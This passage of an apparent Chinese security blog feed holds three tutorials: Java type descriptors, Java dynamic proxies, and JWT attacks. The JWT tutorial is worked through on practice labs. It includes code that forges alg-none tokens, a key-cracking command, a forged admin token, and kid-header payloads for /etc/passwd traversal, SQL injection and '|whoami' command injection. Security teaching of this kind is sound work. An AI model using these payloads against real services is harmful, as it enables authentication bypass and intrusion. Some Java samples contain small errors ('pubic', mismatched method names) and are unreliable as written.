<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
<p>我们在来看下Class的getName()方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终实现交给了getnamenative()方法。</p>
<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
<p>对于非数组类型:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">



<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
<p>对于数组类型；</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">

<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
<p>我们来看看getName()方法的文档:</p>
<ul>
<li>对于原始数据类型，返回其 java 关键字</li>
<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
</ul>
<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT攻击</title>
    <url>/2021/11/26/JWT%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h1><hr>
<h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><hr>
<p>JSON Web Token（JWT）是一种用于客户端和服务端通信双方之间传递身份认证信息、URL安全的表述性声明规范，经常用在跨域身份验证，分布式站点的单点登录。</p>
<h2 id="JWT认证流程"><a href="#JWT认证流程" class="headerlink" title="JWT认证流程"></a><strong>JWT认证流程</strong></h2><p>如图所示：</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122154727932.png" class title="image-20211122154727932">



<p>1.在客户端提交用户名密码等认证信息到服务端进行验证，服务端验证成功后返回一个具有一定时效性的Token，返回给客户端保存</p>
<p>2.客户端在收到Token后，将其保存在cookie或者LocalStorage中</p>
<p>3.客户端在以后与服务端的通信过程中都会带着这个Token进行请求服务资源，服务端在验证Token后返回对应资源</p>
<p><strong>JWT与其他认证方式区别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">记录访问控制客户端的相关信息，请求服务端时需要带上Cookie访问。对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造。</span><br><span class="line"></span><br><span class="line">Session:</span><br><span class="line">客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，session保存在服务端，当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验</span><br><span class="line"></span><br><span class="line">JWT:</span><br><span class="line">服务端不需要存储会话信息，服务器本身只对Token进行加密，有效减少服务器开销。用于防护CSRF攻击，利于分布式站点的应用拓展</span><br></pre></td></tr></table></figure>



<h2 id="JWT构成"><a href="#JWT构成" class="headerlink" title="JWT构成"></a>JWT构成</h2><p><strong>JWT构成:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一部分；头部（header）</span><br><span class="line"></span><br><span class="line">第二部分: 荷载 (payload)</span><br><span class="line"></span><br><span class="line">第三部分: 签证 (signature)</span><br></pre></td></tr></table></figure>



<p>这三个部分使用Base64进行加密处理，中间以”.”符号进行连接</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122172203146.png" class title="image-20211122172203146">



<h3 id="头部-header"><a href="#头部-header" class="headerlink" title="头部(header)"></a>头部(header)</h3><p>JWT头部承载两部分信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 类型(type).如JWT</span><br><span class="line">2. 加密算法(alg).通常使用HMAC SHA256 HS256</span><br><span class="line">   HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证</span><br><span class="line">   RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文</span><br></pre></td></tr></table></figure>

<p>格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="荷载-payload"><a href="#荷载-payload" class="headerlink" title="荷载(payload)"></a>荷载(payload)</h3><p>荷载就是存放有效信息的地方。</p>
<p>有效信息包括三个部分:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准中注册的声明：</span><br><span class="line">iss(jwt签发者)</span><br><span class="line">sub(jwt面向用户)</span><br><span class="line">aud(接受jwt的一方)</span><br><span class="line">exp(jwt的过期时间，应大于签发时间)</span><br><span class="line">nbf(定义在什么时间之前，该jwt都是不可用)</span><br><span class="line">iat(jwt的签发时间)</span><br><span class="line">jti(jwt的唯一身份标识，用于一次性token,避免重放攻击)</span><br><span class="line"></span><br><span class="line">公共的声明：</span><br><span class="line">公共的声明可以添加任何的信息。一般添加用户的相关信息或者其他业务需要的必要信息(不建议添加敏感信息，因为该部分可进行解码)</span><br><span class="line"></span><br><span class="line">私有的声明：</span><br><span class="line">私有声明一般由提供者和消费者所共同定义的声明(不建议添加敏感信息，因为该部分可进行解码)</span><br></pre></td></tr></table></figure>



<p>JWT荷载部分如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;yzt&quot;</span><br><span class="line">  “aud”：&quot;haoyun&quot;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;exp&quot;: &quot;xxxx-xx-xx&quot;</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="签名-signature"><a href="#签名-signature" class="headerlink" title="签名(signature)"></a>签名(signature)</h3><p>JWT的第三部分为签名信息。</p>
<p>该部分是将头部和荷载这两部分使用Base64编码后拼接，使用头部中指定的加密算法(alg字段)进行加密等到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alg(BASE64ENCODE(Header)+BASE64ENCODE(PAYLOAD))</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">&#x27;.&#x27;</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">&#x27;secret&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="JWT攻击-1"><a href="#JWT攻击-1" class="headerlink" title="JWT攻击"></a>JWT攻击</h2><hr>
<p>我们从上面JWT的构造来看，针对JWT的攻击还是在Header和Payload这两部分。比如敏感信息泄露，空加密，密钥爆破等</p>
<h3 id="常见JWT漏洞存在位置"><a href="#常见JWT漏洞存在位置" class="headerlink" title="常见JWT漏洞存在位置"></a>常见JWT漏洞存在位置</h3><p>（1）Header部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否支持修改算法为none/对称加密算法</span><br><span class="line">是否可以删除签名</span><br><span class="line">插入错误信息</span><br><span class="line">kid字段是否有SQL注入/命令注入/目录遍历</span><br><span class="line">jwk元素是否可信</span><br><span class="line">是否强制使用白名单上的加密算法</span><br></pre></td></tr></table></figure>



<p>（2）Payload部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中是否存在敏感信息检查过期策略，比如 exp, iat</span><br></pre></td></tr></table></figure>



<p>（3）Signature部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查是否强制检查签名</span><br><span class="line">密钥是否可以爆破（如HMAC)</span><br><span class="line">是否可以通过其他方式拿到密钥</span><br><span class="line">采用了自身存在脆弱性的算法（如ECDH-ES）</span><br><span class="line">签名方法之间是否存在冲突</span><br></pre></td></tr></table></figure>



<p>（4）其他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重放</span><br><span class="line">通过匹配校验的时间做时间攻击</span><br><span class="line">修改算法非对称算法为对称算法（如修改RS256为HS256）</span><br><span class="line">弱密钥破解</span><br><span class="line">不安全的配置所导致的敏感信息泄露（如在报错信息中泄露签名）</span><br></pre></td></tr></table></figure>



<p>这里需要使用的工具如下:</p>
<p>JWT解密地址:<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<p>MD5解密工具:<a href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p>JWT靶场地址:</p>
<p><a href="https://authlab.digi.ninja/">https://authlab.digi.ninja/</a></p>
<p>webgoat离线靶场</p>
<p>Base64编码 &#x2F;解码工具:</p>
<p><a href="https://tool.oschina.net/encrypt?type=3">在线加密解密 (oschina.net)</a></p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>当在荷载(payload)中添加了一些敏感信息(如账号密码等)，可通过Base64解码得到。</p>
<p>靶场地址: <a href="https://authlab.digi.ninja/Leaky_JWT">Leaky JWT (digi.ninja)</a></p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193259546.png" class title="image-20211122193259546">



<p>将图中的JWT进行解密</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193555616.png" class title="image-20211122193555616">



<p>可以看到在荷载中的用户名(username)和密码(password)等字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;level&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;2ac9cb7dc02b3c0083eb70898e549b63&quot;,</span><br><span class="line">  &quot;username&quot;: &quot;joe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里的密码字段由MD5加密而成，尝试进行解密</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193807785.png" class title="image-20211122193807785">



<p>将得到的账户和密码在靶场中登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: joe</span><br><span class="line">passwd:Password1</span><br></pre></td></tr></table></figure>

<p>登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193946272.png" class title="image-20211122193946272">



<h3 id="无效签名（CVE-2019-7644）"><a href="#无效签名（CVE-2019-7644）" class="headerlink" title="无效签名（CVE-2019-7644）"></a>无效签名（CVE-2019-7644）</h3><p>1.0.4 之前的Auth0 Auth0-WCF-Service-JWT 在无法成功验证 JWT 签名时，会在错误消息中泄漏预期的 JWT 签名。如果向攻击者显示此错误消息，他们可以伪造任意 JWT 令牌，该令牌将被易受攻击的应用程序接受</p>
<p>靶场地址:</p>
<p><a href="https://authlab.digi.ninja/Auth1">Auth1 (digi.ninja)</a></p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123201720181.png" class title="image-20211123201720181">



<p>当对JWT进行改动时，会报错显示签名</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123202044385.png" class title="image-20211123202044385">

<p>签名如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hnpn5k6NtrXn8qvOuiSsFjXhAolQGn3TfmGBvA7EGTU</span><br></pre></td></tr></table></figure>



<p>将报错显示的签名信息替换原来的Signature（签名）字段，登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126144522655.png" class title="image-20211126144522655">





<h3 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h3><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
<p><strong>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</strong></p>
<p>由于alg字段为none,所以只要把signature设置为空提交到服务器，token都可以通过服务器的验证.</p>
<p>靶场地址:</p>
<p><a href="https://authlab.digi.ninja/JWT_None">JWT None Algorithm (digi.ninja)</a></p>
<p>代码如下；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>



<p>使用Base64编码工具设置JWT的Header部分的alg字段为None</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126111400515.png" class title="image-20211126111400515">





<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123203312415.png" class title="image-20211123203312415">



<h3 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h3><p>JWT中最常用的两种算法是HMAC和RSA。这两种算法都是使用私钥对signature字段进行签名，所以只要拥有了加密使用的私钥，才能伪造token.但HMAC这种对称加密算法，只有一个密钥进行加密解密。</p>
<p>JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p>靶场地址；</p>
<p><a href="https://authlab.digi.ninja/JWT_Cracking">Cracking JWT Keys (digi.ninja)</a></p>
<p>爆破工具；</p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>我们打开靶场地址，如下:</p>
<p>可以看到使用靶场提供的JWT登录为jasper用户</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126135442521.png" class title="image-20211126135442521">



<p>命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Build a Docker Image</span><br><span class="line">docker build . -t jwtcrack</span><br><span class="line"></span><br><span class="line">//Run on Docker</span><br><span class="line">docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2Mzc4OTgwMjgsImxldmVsIjoidXNlciIsInVzZXIiOiJqYXNwZXIifQ.T1J2RL69EufdU4I6g_JnKm3UaITCJsk5DxrR2HgDFhk</span><br></pre></td></tr></table></figure>

<p>使用cracker工具爆破JWT中的密钥，可以看到下方密钥为hello</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126135148847.png" class title="image-20211126135148847">

<p>知道密钥后我们可以自定义设置JWT内容，设置加密密钥为hello，伪造登录用户</p>
<p>下面我们来伪造JWT</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126141542944.png" class title="image-20211126141542944">

<p>得到伪造的JWT：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2Mzc4OTgwMjgsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoid2hhbGVmYWxsIn0.DpJepuO0BICPKPFevJfTvLTPthbsKS9FvQv_Ws_h1AM</span><br></pre></td></tr></table></figure>



<p>将伪造的JWT放到靶场进行登录，登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126141706896.png" class title="image-20211126141706896">



<h3 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数"></a>修改KID参数</h3><p>KID(KEY ID)是JWT Header中的一个可选字段,用于指定加密算法的密钥。针对KID参数的攻击存在目录遍历、SQL注入、命令注入等。</p>
<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/path/to/key_file|whoami&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="修改JKU-x2F-XSU参数"><a href="#修改JKU-x2F-XSU参数" class="headerlink" title="修改JKU&#x2F;XSU参数"></a>修改JKU&#x2F;XSU参数</h3><p>这两个参数也是为Header部分的可选字段，JKU（JWKSet URL）用于指定链接到一组加密token密钥的URL。XSU头部参数允许攻击者用户验证Token的公钥证书或者证书链。</p>
<p>如果没有对JKU字段内容进行严格过滤且舐限定条件，可以随机指定一组自定义密钥文件，并指定Web应用使用设置的密钥来验证token。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>认证方式</category>
      </categories>
      <tags>
        <tag>-JWT - 认证方式</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>动态代理在Java中有着广泛的应用，比如Spring AOP、Hibernate数据查询、测试框架的后端mock、RPC远程调用、Java注解对象获取、日志、用户鉴权、全局性异常处理、性能监控，甚至事务处理等</p>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>创建一个代理对对象进行包装，用该代理对象取代原对象。后续操作中，任何对原对象的调用都要先通过代理对象。代理对象决定是否将方法调用转到原对象上。</p>
<p>代理模式是一种结构型设计模式，代理模式角色分为 3 种:</p>
<p><strong>Subject（抽象主题角色）</strong>：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法；</p>
<p><strong>RealSubject（真实主题角色</strong>）：真正实现业务逻辑的类；</p>
<p><strong>Proxy（代理主题角色）</strong>：用来代理和封装真实主题；</p>
<p>代理模式的结构比较简单，其核心是代理类，为了让客户端能够<strong>一致性地对待</strong>真实对象和代理对象，在代理模式中引入了抽象层.</p>
<p>代理模式<strong>按照职责</strong>（使用场景）来分类，至少可以分为以下几类：</p>
<p>1、远程代理  </p>
<p>2、虚拟代理 </p>
<p> 3、Copy-on-Write 代理   </p>
<p>4、保护（Protect or Access）代理  </p>
<p>5、Cache代理 </p>
<p> 6、防火墙（Firewall）代理  </p>
<p>7、同步化（Synchronization）代理 </p>
<p> 8、智能引用（Smart Reference）代理等等。</p>
<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
<ul>
<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。</li>
</ul>
<h2 id="代理模式优势"><a href="#代理模式优势" class="headerlink" title="代理模式优势"></a>代理模式优势</h2><p>代理模式能够赋予我们控制访问某个类的能力，在某些情况下，代理可以允许我们屏蔽或控制某个对象的逻辑。在此基础上，引申出来的作用，也是目前开发中最常使用的作用：<code>在不修改原对象代码的基础上，对原对象的功能进行修改或者增强</code>。</p>
<h3 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h3><p>降低耦合度甚至解除耦合</p>
<p><strong>耦合</strong></p>
<p>当项目中的各个模块或者各个组件，当一个发生变动或者调用的时候，其他一些模块或组件也会产生变化或者调用，类似于齿轮的运转。</p>
<p><strong>耦合的问题</strong></p>
<p>当模块或组件耦合度过高时，会带来难以扩展、维护性差、纠错困难等问题，所以在设计时，要尽可能避免模块或组件之间的耦合度过高。</p>
<p>当我们想要给某个对象添加有些额外逻辑时，就可以使用代理模式，在不修改原代码的前提下，只针对额外功能进行编码。在整个过程中，原对象的逻辑和额外逻辑完全解耦，互不干扰。</p>
<h3 id="高扩展"><a href="#高扩展" class="headerlink" title="高扩展"></a>高扩展</h3><p>由于模块之间的解耦性，我们可以随时添加任意的功能或者修改之前的功能而不影响原模块的正常执行。</p>
<h2 id="JAVA代理模式"><a href="#JAVA代理模式" class="headerlink" title="JAVA代理模式"></a>JAVA代理模式</h2><p>Java中有三种方式来创建代理对象：</p>
<ul>
<li>静态代理</li>
<li>基于JDK(接口)的动态代理</li>
<li>基于CGLIB(Jar包)的动态代理</li>
</ul>
<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><hr>
<p>手写代理类的代码，工程中有代理类的源码，代理类会编译执行。实现目标类的接口或者直接继承目标类，完成逻辑的修改和增强。</p>
<h4 id="接口实现方式"><a href="#接口实现方式" class="headerlink" title="接口实现方式"></a>接口实现方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183027419.png" class title="image-20220208183027419">

<p>目标类:  程序猿(Developer) </p>
<p>代理类:   Java程序猿(JavaDeveloper)  FullStack程序猿(FullStackDeveloper)</p>
<p>程序猿(Develpoer.java)</p>
<p>定义一个程序员的接口，只干两件事情（程序员太忙，别的做不了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">coded</span><span class="params">()</span></span>;<span class="comment">//会写代码</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>;<span class="comment">//会调试程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>java程序猿会开发和调试java代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeveloper</span> <span class="keyword">implements</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JavaDeveloper</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">pubic <span class="keyword">void</span> <span class="title">code</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is  codding JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is debugging JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后有个FullStack程序猿，在开发之前都会祈祷一下，这样他的代码就不会有bug，也不需要调试。</p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208180230522.png" class title="image-20220208180230522">

<p>全栈程序猿(FullStackDeveloper.java)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class FullStackDeveloper implements Developer &#123;</span><br><span class="line">   private Developer developer;</span><br><span class="line">   public FullStackDeveloper(Developer developer)</span><br><span class="line">   &#123;</span><br><span class="line">       this.developer = developer;</span><br><span class="line">   &#125;</span><br><span class="line">   public void code()</span><br><span class="line">   &#123;</span><br><span class="line">       System.out.println(&quot;FullStackDeveloper is praying for the code!&quot;);</span><br><span class="line">       this.developer.code();</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;FullStackDeveloper&#x27;s  code is bug-free and does not require dedbugging&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer str = new JavaDeveloper(&quot;YZT&quot;);</span><br><span class="line">        Developer developer = new FullStackDeveloper(str);</span><br><span class="line">        developer.code();</span><br><span class="line">        developer.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208182141430.png" class title="image-20220208182141430">

<p>如果YZT只是一个普通的Java程序猿，则开发结果是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line"></span><br><span class="line">YZT is  debugging  JavaDeveloper!</span><br></pre></td></tr></table></figure>



<p>但YZT是个全栈程序猿是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  praying for the code!</span><br><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line">YZT&#x27;code is bug-free and does not require dedbugging!</span><br></pre></td></tr></table></figure>



<h4 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183204722.png" class title="image-20220208183204722">

<p><strong>示例</strong></p>
<p>目标类:  程序猿(Developer) </p>
<p>代理类:   Java程序猿(JavaDeveloper)</p>
<p>程序猿类(Developer)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Developer &#123;</span><br><span class="line">    public String  code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">     return str+&quot; is coding Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public String  debug(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        return str+&quot; is a debugging Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java程序猿(javaDeveloper)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JavaDeveloper extends Developer &#123;</span><br><span class="line">    public String code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        String str1 = super.code(str);</span><br><span class="line">        String str2 = super.debug(str);</span><br><span class="line">        System.out.println(&quot;Wish you have a good Luck!&quot;);</span><br><span class="line">        return str1 +str2+ &quot; He will become a good Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer developer = new JavaDeveloper();</span><br><span class="line">        System.out.println(developer.code(&quot;YZT&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208190213980.png" class title="image-20220208190213980">



<h4 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4><p>静态代理虽然能实现代理模式，完成解耦，但是静态代理类的代码维护依然非常复杂，一旦接口或者父类发生了变动，则代理类的代码就得随之修改，代理类多的时候维护十分麻烦。</p>
